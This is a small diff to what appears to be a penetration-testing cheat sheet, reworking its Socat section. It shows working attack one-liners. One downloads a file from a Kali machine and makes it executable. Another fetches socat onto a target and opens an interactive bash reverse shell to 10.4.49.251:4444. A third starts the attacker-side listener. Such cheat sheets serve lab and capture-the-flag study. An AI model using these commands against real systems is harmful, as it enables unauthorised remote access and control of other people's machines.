@@ -42,9 +42,15 @@ Download file from local Web server on kali
 export dlfile=[FILE NAME]; wget http://10.4.49.251/${dlfile} -O /tmp/${dlfile}; chmod +x /tmp/${dlfile}
 ```
 
-Download Socat and execute it from local Web server on kali
+### Socat
+・Target Host  
 ```
 wget http://10.4.49.251/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.4.49.251:4444
+```
+
+・Attacker (Kali)
+```
+socat file:`tty`,raw,echo=0 TCP-L:4444
 ```
 
 ## Exploit DB (Windows)
